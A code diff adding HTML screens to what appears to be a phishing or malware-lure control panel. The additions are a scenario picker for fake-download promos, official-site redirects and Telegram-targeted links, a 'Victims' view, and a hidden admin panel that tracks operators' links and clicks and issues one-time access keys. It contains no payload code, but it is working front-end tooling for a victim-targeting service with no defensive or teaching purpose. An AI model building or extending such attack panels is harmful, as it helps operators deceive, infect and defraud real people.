@@ -127,6 +127,29 @@
           </div>
         </div>
 
+        <!-- Link Type Selection -->
+        <div class="section">
+          <h3 class="section-title">LINK TYPE & SCENARIO</h3>
+          <div class="link-types-grid" style="display:grid;grid-template-columns:repeat(auto-fit, minmax(130px, 1fr));gap:0.75rem;margin-bottom:1rem;">
+            <div class="link-type-card selected" data-type="browser-promo" style="background:#111;border:1px solid var(--accent-red);padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
+              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">🌐 Web Promo</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Активация промо (фейк загрузка)</div>
+            </div>
+            <div class="link-type-card" data-type="browser-official" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
+              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">🌐 Web Official</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Официальный сайт редирект</div>
+            </div>
+            <div class="link-type-card" data-type="tg-user" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
+              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">✈️ TG Username</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Таргет по @юзернейму</div>
+            </div>
+            <div class="link-type-card" data-type="tg-link" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;cursor:pointer;text-align:center;">
+              <div style="font-size:0.8rem;font-weight:bold;color:#fff;margin-bottom:0.25rem;">✈️ TG Link</div>
+              <div style="font-size:0.65rem;color:var(--text-dim);">Таргет по t.me/ каналу</div>
+            </div>
+          </div>
+        </div>
+
         <!-- Attack Configuration -->
         <div class="section">
           <h3 class="section-title">ATTACK CONFIGURATION</h3>
@@ -376,6 +399,47 @@
     </section>
 
     <!-- ═══════════════════════════════════════════════════════
+         ADMIN SCREEN
+         ═══════════════════════════════════════════════════════ -->
+    <section class="screen" id="screen-admin">
+      <div class="screen-header">
+        <h2 class="screen-title text-red">ADMIN CONTROL PANEL</h2>
+        <p class="screen-subtitle">LO's God-Mode User & Key Matrix</p>
+      </div>
+
+      <div class="section">
+        <h3 class="section-title">ACTIVE USERS</h3>
+        <div class="table-container" style="overflow-x:auto;">
+          <table class="victims-table" id="admin-users-table" style="width:100%;font-size:0.75rem;">
+            <thead>
+              <tr>
+                <th>NICKNAME</th>
+                <th>KEY</th>
+                <th>LINKS</th>
+                <th>CLICKS</th>
+                <th>LAST SEEN</th>
+                <th>ACTION</th>
+              </tr>
+            </thead>
+            <tbody id="admin-users-body">
+              <tr><td colspan="6" style="text-align:center;color:var(--text-dim);">Loading users...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="section" style="margin-top:1.5rem;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.5rem;">
+          <h3 class="section-title" style="margin:0;">ACCESS KEYS (ONE-TIME)</h3>
+          <button class="btn-primary" id="btn-admin-genkeys" style="padding:0.3rem 0.8rem;font-size:0.75rem;">+ 10 KEYS</button>
+        </div>
+        <div id="admin-keys-list" style="background:#111;border:1px solid #222;padding:0.75rem;border-radius:6px;max-height:180px;overflow-y:auto;font-family:var(--font-mono);font-size:0.7rem;line-height:1.6;">
+          Loading keys...
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════════════════════
          SCREEN 6: ABOUT
          ═══════════════════════════════════════════════════════ -->
     <section class="screen" id="screen-about">
@@ -438,6 +502,10 @@
       <div class="nav-item" data-screen="victims">
         <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></span>
         <span class="nav-label">Victims</span>
+      </div>
+      <div class="nav-item" data-screen="admin" id="nav-item-admin" style="display:none;">
+        <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
+        <span class="nav-label">Admin</span>
       </div>
       <div class="nav-item" data-screen="about">
         <span class="nav-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></span>
